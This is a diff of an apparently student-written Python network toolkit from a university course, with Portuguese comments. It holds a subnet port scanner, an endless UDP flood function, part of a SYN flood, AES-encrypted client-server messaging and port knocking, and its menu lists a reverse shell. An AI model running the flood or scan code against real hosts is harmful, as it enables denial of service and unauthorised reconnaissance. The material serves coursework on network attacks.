@@ -1,38 +1,45 @@
-import os
-import socket
-import ipaddress
-import random
-import time
-import string
-import subprocess
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad, unpad
-from cryptography.hazmat.backends import default_backend
-from cryptography.hazmat.primitives import hashes
-from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+# Para executar o código abaixo em uma máquina Kali Linux, é necessário em grande parte das vezes instalar as Bibliotecas utilizando os seguintes comandos:
+# sudo pip install scapy
+# sudo pip install pycryptodome
+# sudo pip install cryptography
+ 
+
+import os  # Gerar um valor salt aleatório em criptografia
+import socket  # Usado em todas as funções de rede para criar conexões TCP/UDP
+import ipaddress  # Gerar e manipular faixas de endereços IP na varredura de portas
+import random  # Gerar números aleatórios, como portas em flood_udp e bytes aleatórios
+import time  # Introduzir atrasos, por exemplo, no port knocking
+from scapy.all import *  # Usado na função syn_flood para criação e envio de pacotes de rede personalizados
+from Crypto.Cipher import AES  # Encriptação e decriptação AES nas funções de troca de mensagens
+from Crypto.Util.Padding import pad, unpad  # Adicionar e remover padding em blocos AES
+from cryptography.hazmat.backends import default_backend  # Backend para a geração de chaves criptográficas
+from cryptography.hazmat.primitives import hashes  # Especificar o algoritmo de hash na geração de chaves
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC  # Derivar uma chave a partir de uma senha e salt
 
 
 # Parte das funções abaixo foram adaptadas dos exemplos demonstrados em aula no IPBeja pelo Professor Armando Ventura no módulo de Linguagens de Programação Dinâmicas. 
 
 def varredura_de_portas(faixa_ips_alvo, porta_inicial, porta_final):
+    # Cria uma faixa de IPs a partir do argumento fornecido
     faixa_ip = ipaddress.IPv4Network(faixa_ips_alvo, strict=False)
 
-    for ip_alvo in faixa_ip:
-        portas_abertas = []
-        portas_fechadas = 0
+    for ip_alvo in faixa_ip: # Itera sobre cada IP na faixa
+        portas_abertas = [] # Lista para armazenar portas abertas
+        portas_fechadas = 0 # Contador de portas fechadas
 
-        for porta in range(porta_inicial, porta_final + 1):
+        for porta in range(porta_inicial, porta_final + 1): # Itera sobre o intervalo de portas
             soquete = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            soquete.settimeout(1)
+            soquete.settimeout(1) # Define um timeout para a conexão
 
             resultado = soquete.connect_ex((str(ip_alvo), porta))
             soquete.close()
 
-            if resultado == 0:
+            if resultado == 0: # Se a conexão for bem-sucedida, a porta está aberta
                 portas_abertas.append(str(porta))
-            else:
+            else: # Se não, incrementa o contador de portas fechadas
                 portas_fechadas += 1
 
+        # Exibe os resultados para o IP atual
         print(f"\nResultados para o IP {ip_alvo}:")
         print("Portas abertas: " + ", ".join(portas_abertas))
         print(f"Número de Portas Fechadas: {portas_fechadas}")
@@ -40,17 +47,17 @@ def varredura_de_portas(faixa_ips_alvo, porta_inicial, porta_final):
 
 def flood_udp(ip_alvo):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    bytes_to_send = random._urandom(1024)
+    bytes_to_send = random._urandom(1024) # Gera um payload aleatório
 
     sent = 0
-    while True:
+    while True: # Envia pacotes indefinidamente
         sock.sendto(bytes_to_send, (ip_alvo, random.randint(1, 65535)))
         sent += 1
         print(f"Sent {sent} amount of packets to {ip_alvo}")
-        # Caso queira limitar o número de Pacotes --->
+        ### Caso queira limitar o número de Pacotes --->
         # if sent >= 100000:
             # break
-        # Caso queira limitar o número de Pacotes <---
+        ### Caso queira limitar o número de Pacotes <---
 
 
 # Based on "How to Make a SYN Flooding Attack in Python" / "Abdeladim Fadheli" Article - https://thepythoncode.com/article/syn-flooding-attack-using-scapy-in-python --->
@@ -66,6 +73,7 @@ def syn_flood(ip_alvo):
 
 # Conjunto de Funções para a Troca de Mensagens Servidor/Cliente --->
 def generate_key_from_password(password, salt):
+    # Gera uma chave a partir de uma senha usando PBKDF2
     kdf = PBKDF2HMAC(
         algorithm=hashes.SHA256(),
         length=32,
@@ -73,32 +81,32 @@ def generate_key_from_password(password, salt):
         iterations=100000,
         backend=default_backend()
     )
-    key = kdf.derive(password.encode()) 
-    return key
+    return kdf.derive(password.encode())
 
 def encrypt_message(key, message, salt):
+    # Encripta uma mensagem usando AES
     cipher = AES.new(key, AES.MODE_CBC)
     ct_bytes = cipher.encrypt(pad(message, AES.block_size))
     return salt + cipher.iv + ct_bytes  
 
 def decrypt_message(password, encrypted_message):
+    # Desencripta uma mensagem usando AES
     salt = encrypted_message[:16]
     iv = encrypted_message[16:32]
     ct = encrypted_message[32:]
     key = generate_key_from_password(password, salt)
     cipher = AES.new(key, AES.MODE_CBC, iv)
-    pt = unpad(cipher.decrypt(ct), AES.block_size)
-    return pt
+    return unpad(cipher.decrypt(ct), AES.block_size)
 
 def server_side(port, password):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.bind(('127.0.0.1', port))
+        s.bind(('127.0.0.1', port)) # Configura o servidor para escutar em localhost na porta especificada
         s.listen()
-        conn, addr = s.accept()
+        conn, addr = s.accept() # Aceita uma conexão
         conn.send("Conectado".encode())
         dataFromClient = conn.recv(4096)
-        decrypted_data = decrypt_message(password, dataFromClient)
+        decrypted_data = decrypt_message(password, dataFromClient) # Desencripta os dados recebidos
         print(decrypted_data.decode())
         conn.close()
     except Exception as e:
@@ -106,40 +114,41 @@ def server_side(port, password):
 
 def client_side(ip, port, password):
     try:
-        salt = os.urandom(16) 
+        salt = os.urandom(16) # Gera um salt aleatório
         key = generate_key_from_password(password, salt)
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((ip, port))
+        s.connect((ip, port)) # Conecta ao servidor
         dataFromServer = s.recv(1024)
         print(dataFromServer.decode())
         dataToServer = "Conectando"
-        encrypted_data = encrypt_message(key, dataToServer.encode(), salt)
+        encrypted_data = encrypt_message(key, dataToServer.encode(), salt) # Encripta os dados a serem enviados
         s.send(encrypted_data)
         s.close()
     except Exception as e:
         print(f"An error occurred: {e}")
+
 # Conjunto de Funções para a Troca de Mensagens Servidor/Cliente <---
 
 
 def port_knocking():
     target_ip = input("Digite o endereço IP do servidor alvo: ")
-    knocking_ports = [int(port) for port in input("Digite as portas para o port knocking (separadas por espaço): ").split()]
+    knocking_ports = [int(port) for port in input("Digite as portas para o port knocking (separadas por espaço): ").split()] # Lista de portas para o port knocking
     for port in knocking_ports:
         with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
-            s.sendto(b'', (target_ip, port))
-            time.sleep(1) # Define o tempo de comunicação entre as portas
+            s.sendto(b'', (target_ip, port)) # Envia um pacote vazio para cada porta
+            time.sleep(1) # Espera 1 segundo entre cada envio
 
 
 def Menu_do_Programa():
     os.system('clear')
-    print("\nLPD-Project | Linguagens de Programação Dinâmicas")
+    print("\nLPD-Project | Linguagens de Programação Dinâmicas\n")
     print("1- Port Scan")
     print("2- UDP Flood")
     print("3- SYN Flood")
-    print("4- Análise e Processamento de Ficheiros de Log")
+    # print("(Em Desenvolvimento) 4- Análise e Processamento de Ficheiros de Log")
     print("5- Troca de Mensagens")
     print("6- Client Port Knocking")
-    print("7- Reverse Shell")
+    print("(Adicional) 7- Reverse Shell")
     print("\n0- Sair\n")
 
 
